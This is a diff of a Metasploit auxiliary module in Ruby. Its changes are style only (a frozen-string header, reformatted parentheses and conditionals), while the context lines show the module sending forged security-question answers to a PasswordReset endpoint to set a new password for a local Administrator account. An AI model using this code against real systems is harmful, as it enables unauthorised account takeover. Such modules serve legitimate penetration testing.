@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -40,7 +41,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('LOCALUSER', [true, 'The user to change password for', 'Administrator']),
         OptString.new('LOCALPASS', [false, 'The password to set for the local user (blank for random)', '']),
         OptString.new('DOMAIN', [false, 'The domain of the user. By default the local user\'s computer name will be autodetected', ''])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def localuser
@@ -129,7 +131,7 @@ class MetasploitModule < Msf::Auxiliary
         'domainname' => domain,
         'userName' => localuser,
         'emailaddress' => Rex::Text.rand_text_alpha(8) + '@' + Rex::Text.rand_text_alpha(8) + '.com',
-        'userQuestions' => %Q([{"Id":1,"Answer":"#{answers.first}"},{"Id":2,"Answer":"#{answers.last}"}]),
+        'userQuestions' => %([{"Id":1,"Answer":"#{answers.first}"},{"Id":2,"Answer":"#{answers.last}"}]),
         'updatequesChk' => 'false',
         'SelectedQuestion' => 2,
         'answer' => answers.last,
@@ -144,11 +146,11 @@ class MetasploitModule < Msf::Auxiliary
 
     vprint_status("#{peer}: changing password for #{full_user}")
 
-    if datastore['LOCALPASS'].blank?
-      password = Rex::Text.rand_text_alpha(10) + "!1"
-    else
-      password = datastore['LOCALPASS']
-    end
+    password = if datastore['LOCALPASS'].blank?
+                 Rex::Text.rand_text_alpha(10) + "!1"
+               else
+                 datastore['LOCALPASS']
+               end
 
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),
